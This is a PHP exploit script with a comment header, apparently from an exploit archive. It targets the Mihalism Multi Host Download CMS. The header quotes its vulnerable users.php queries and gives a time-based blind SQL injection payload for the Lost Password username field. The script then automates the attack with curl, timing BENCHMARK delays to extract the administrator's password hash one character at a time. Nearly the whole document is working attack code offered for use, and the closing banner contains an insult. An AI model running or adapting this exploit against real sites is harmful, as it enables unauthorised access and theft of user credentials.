Mihalism Multi Host Download (Username) Blind SQL Injection Exploit
===================================================================



<?php

/*
###############################################################################
#                                                                                         
#                                                                             
# Mihalism Multi Host Download - Blind SQL Injection Attack                   
#                                                                              
# Thanks to Vladii for telling me about the CMS.                              
# Thanks to Shocker for telling Vladii about the CMS.                         
#                                                                             
#                                                                             
# Shoutz to Kw3rln, Bankai, Slick, Nemessis                                                                                  
#                                                                             
# Ride as high as possible                                                    
#                                                                             
#                                                                             
# Vulnerable Code is everywhere.                                              
# I&#039;ll talk about users.php                                                   
#                                                                             
###############################################################################* 

We have the code 

Line 107:
$DB->query("SELECT * FROM `".SQL_USERS_TABLE."` WHERE `user_name` = &#039;".$_POST[&#039;user_name&#039;]."&#039;");

Line 112:
$DB->query("INSERT INTO `".SQL_USERS_TABLE."` VALUES(&#039;&#039;, &#039;".$_POST[&#039;user_name&#039;]."&#039;, &#039;".md5($_POST[&#039;user_pass_1&#039;])."&#039;, &#039;&#039;, &#039;".$_SERVER[&#039;REMOTE_ADDR&#039;]."&#039;, &#039;".$_POST[&#039;user_email&#039;]."&#039;, &#039;".$_POST[&#039;private&#039;]."&#039;, &#039;".time()."&#039;, &#039;NORMAL&#039;, &#039;".$_POST[&#039;country&#039;]."&#039;, &#039;".$dob."&#039;, &#039;".$_POST[&#039;gender&#039;]."&#039;)");

............

I&#039;ll create the query for lost password.
Click "Lost Password" and enter the SQL Injection in Username. The email address you could just leave it empty

Injection:
&#039; UNION SELECT IF ( SUBSTRING(password,1,1) = &#039;1&#039;, BENCHMARK(2000000, ENCODE(&#039;a&#039;,&#039;b&#039;)), 1 ),2,3,4,5,6,7,8,9,10,11,12 from mmh_user_data where user_id=&#039;1

The password is saved in hashed form so you only search for 0..9, a..f and you have the admin&#039;s hash

This vulnerable code is:
$DB->query("SELECT * FROM `".SQL_USERS_TABLE."` WHERE `user_name` = &#039;{$_POST[&#039;username&#039;]}&#039;");

So the query becomes:
SELECT * FROM `mmh_user_data` WHERE `user_name` = &#039;&#039; UNION SELECT IF ( SUBSTRING(password,1,1) = &#039;1&#039;, BENCHMARK(20000000, ENCODE(&#039;a&#039;,&#039;b&#039;)), 1 )
,2,3,4,5,6,7,8,9,10,11,12 from mmh_user_data where user_id=&#039;1&#039;

Delay-ing the response if the first character of the admin&#039;s hash is equal to &#039;1&#039;

*/

function goto_help()
{
	echo "-----------------------------------------------------------------------------------------\n";
	echo "* Usage php ". $argv[0] ." [full_link] [userid] \n";
	echo "* example:\n";
	echo "* php ". $argv[0] ." http://localhost/multihost/users.php?act=lost_password_go 1 \n";
	echo "-----------------------------------------------------------------------------------------\n";
	exit();
}


$chars = array(&#039;0&#039;, &#039;1&#039;, &#039;2&#039;, &#039;3&#039;, &#039;4&#039;, &#039;5&#039;, &#039;6&#039;, &#039;7&#039;, &#039;8&#039;, &#039;9&#039;, &#039;0&#039;, &#039;a&#039;, &#039;b&#039;, &#039;c&#039;, &#039;d&#039;, &#039;e&#039;, &#039;f&#039;);

$host = $argv[1];
$userid = (empty($argv[2]) == true ? 1 : $argv[2]);

if (empty ($argv[1]))
{
	goto_help();
}

echo "---------------------------------------------------\n";
echo "Starting to exploit $host\n";
echo "Userid exploited is $userid\n";
echo "---------------------------------------------------\n";

$hash = "";

$conn = curl_init();
curl_setopt($conn, CURLOPT_POST, true);
curl_setopt($conn, CURLOPT_URL, $host);
curl_setopt($conn, CURLOPT_RETURNTRANSFER, true);

for ($length = 1 ; $length <= 32 ; $length++)
{
	for ($char = 0 ; $char <= 16 ; $char++)
	{
		$query = "&#039; UNION SELECT IF ( SUBSTRING(password,". $length .",1) = &#039;". $chars[$char] ."&#039;, BENCHMARK(20000000, ENCODE(&#039;a&#039;,&#039;b&#039;)), 1 ),2,3,4,5,6,7,8,9,10,11,12 from mmh_user_data where user_id=&#039;". $userid;
		//echo $query  ."\n";
		$start = time(); $end = $start;
		curl_setopt($conn, CURLOPT_POSTFIELDS, &#039;username=&#039;. urlencode($query) .&#039;&user_email=1&#039;);
		curl_exec( $conn );
		$end = time();
		
		//if we have a hit
		if (($end - $start) > 5) 
		{
			echo "possible hit for ". $chars[$char] ."\n";
			$hash .= $chars[$char];
			break;
		}
		else
		{
			echo $chars[$char]. " ";
		}
	}
}


echo "---------------------------------------------------\n";
echo "* Exploit made by Moubik\n";
echo "* Romanian Security Zone - http://rstzone.org/\n";
echo "* esc6 esti un retardat\n";
echo "---------------------------------------------------\n";
echo "* Hash found for userid=". $userid . "\n";
echo "* hash=". $hash . "\n";
echo "---------------------------------------------------\n";


?>




